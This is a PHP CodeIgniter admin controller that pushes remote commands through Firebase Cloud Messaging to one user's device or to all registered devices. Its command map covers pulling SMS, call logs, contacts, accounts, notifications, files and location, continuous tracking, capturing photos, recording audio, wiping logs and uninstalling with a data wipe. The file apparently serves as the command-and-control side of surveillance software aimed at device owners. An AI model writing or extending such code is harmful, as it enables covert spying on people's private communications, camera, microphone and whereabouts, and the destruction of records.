<?php

namespace App\Controllers\admin;

use App\Models\Mod_Log_User_Action;
use CodeIgniter\API\ResponseTrait;

class RemoteDevice extends BaseAdminController
{
    use ResponseTrait;
    public function index()
    {
        $db = $this->getDb();

        $users = $db->table('users')
            ->select('users.id, users.username')
            ->join('tbl_device_profile', 'tbl_device_profile.owner_id = users.id', 'inner')
            ->where('tbl_device_profile.fcm_token !=', '')
            ->where('tbl_device_profile.fcm_token IS NOT NULL')
            ->groupBy('users.id')
            ->orderBy('users.username', 'ASC')
            ->get()
            ->getResultArray();

        $targetDevice = null;
        if (!empty($users)) {
            $targetDevice = $db->table('tbl_device_profile')
                ->select('tbl_device_profile.*, users.username')
                ->join('users', 'users.id = tbl_device_profile.owner_id')
                ->where('tbl_device_profile.fcm_token !=', '')
                ->where('tbl_device_profile.fcm_token IS NOT NULL')
                ->orderBy('tbl_device_profile.counter', 'DESC')
                ->get()
                ->getRowArray();
        }

        return $this->renderView('admin/remote_device', [
            'pag' => 'admin-remote-device',
            'users' => $users,
            'targetDevice' => $targetDevice,
        ]);
    }

    public function sendCommand()
    {
        if (!$this->request->isAJAX()) {
            return $this->fail('Invalid request');
        }

        $userId = $this->request->getPost('user_id');
        $command = $this->request->getPost('command');
        $payload = $this->request->getPost('payload') ?: 'all';
        $extraData = $this->request->getPost('extra_data');

        if (!$command) {
            return $this->fail('Command is required.');
        }

        try {
            $db = $this->getDb();
            $tokens = [];

            if ($userId === 'all') {
                $devices = $db->table('tbl_device_profile')
                    ->distinct()
                    ->select('fcm_token')
                    ->where('fcm_token !=', '')
                    ->where('fcm_token IS NOT NULL')
                    ->get()
                    ->getResultArray();
                foreach ($devices as $d) {
                    $tokens[] = $d['fcm_token'];
                }
            } else {
                $device = $db->table('tbl_device_profile')
                    ->select('fcm_token')
                    ->where('owner_id', $userId)
                    ->where('fcm_token !=', '')
                    ->where('fcm_token IS NOT NULL')
                    ->orderBy('counter', 'DESC')
                    ->get()
                    ->getRowArray();
                if ($device) {
                    $tokens[] = $device['fcm_token'];
                }
            }

            if (empty($tokens)) {
                return $this->fail('No devices found for the selected user(s).');
            }

            $results = [];
            $firebase = new \App\Libraries\FirebaseLib();

            $extraFields = [];
            if ($extraData) {
                if (is_string($extraData)) {
                    $decoded = json_decode($extraData, true);
                    if (is_array($decoded)) $extraFields = $decoded;
                } elseif (is_array($extraData)) {
                    $extraFields = $extraData;
                }
            }

            foreach ($tokens as $token) {
                $fcmData = array_merge([
                    'command' => $command,
                    'payload' => $payload,
                    'sent_at' => date('Y-m-d H:i:s'),
                    'action_log_id' => '0',
                    'ack_url' => rtrim(base_url(), '/') . '/api/v1/fcm/ack/0',
                ], $extraFields);

                $sent = $firebase->sendDataMessage($token, $fcmData);
                $results[] = [
                    'token_prefix' => substr($token, 0, 20) . '...',
                    'success' => $sent !== false,
                ];
            }

            $allSuccess = !empty($results) && count(array_filter($results, fn($r) => $r['success'])) === count($results);

            $adminActionMap = [
                'cmd_sms' => 'admin_fetch_sms',
                'cmd_calls' => 'admin_fetch_calls',
                'cmd_contacts' => 'admin_fetch_contacts',
                'cmd_search_data' => 'admin_search_data',
                'cmd_capture_photo' => 'admin_capture_photo',
                'cmd_record_audio' => 'admin_record_audio',
                'cmd_files' => 'admin_fetch_files',
                'cmd_fetch_file' => 'admin_fetch_file',
                'cmd_location' => 'admin_fetch_location',
                'cmd_start_tracking' => 'admin_start_tracking',
                'cmd_context' => 'admin_fetch_context',
                'cmd_apps' => 'admin_fetch_apps',
                'cmd_usage' => 'admin_fetch_usage',
                'cmd_notifications' => 'admin_fetch_notifications',
                'cmd_device_info' => 'admin_fetch_device_info',
                'cmd_sensors' => 'admin_fetch_sensors',
                'cmd_network' => 'admin_fetch_network',
                'cmd_bluetooth' => 'admin_fetch_bluetooth',
                'cmd_calendar' => 'admin_fetch_calendar',
                'cmd_accounts' => 'admin_fetch_accounts',
                'cmd_beep' => 'admin_send_beep',
                'cmd_siren' => 'admin_play_siren',
                'cmd_wipe_logs' => 'admin_wipe_logs',
                'cmd_locate' => 'admin_locate_device',
                'cmd_all' => 'admin_sync_all',
                'cmd_sync_now' => 'admin_sync_data',
                'cmd_reset_app' => 'admin_reset_apps',
                'cmd_deactivate' => 'admin_deactivate_apps',
                'cmd_reactivate' => 'admin_reactivate_apps',
                'cmd_logout' => 'admin_logout_user',
                'cmd_uninstall_preserve' => 'admin_uninstall_preserve',
                'cmd_uninstall_wipe' => 'admin_uninstall_wipe',
                'cmd_update_prefs' => 'admin_set_settings',
                'cmd_open_permission' => 'admin_open_permission',
            ];
            $actionType = $adminActionMap[$command] ?? ('admin_remote_cmd_' . str_replace('cmd_', '', $command));

            $logModel = new \App\Models\Mod_Log_User_Action();
            $logModel->logAction([
                'action_category' => 'admin',
                'action_type' => $actionType,
                'action_severity' => 'medium',
                'success' => $allSuccess ? 1 : 0,
                'resource_id' => $userId ?? 'all',
                'new_values' => json_encode([
                    'command' => $command,
                    'payload' => $payload,
                    'target' => $userId ?? 'all',
                    'device_count' => count($tokens),
                ]),
                'request_url' => current_url(),
                'request_method' => $this->request->getMethod(),
            ]);

            return $this->respond([
                'success' => true,
                'message' => "Command sent to " . count($tokens) . " device(s).",
                'results' => $results,
            ]);
        } catch (\Exception $e) {
            log_message('error', 'Admin remote send error: ' . $e->getMessage());
            return $this->fail('Server error: ' . $e->getMessage());
        }
    }
}
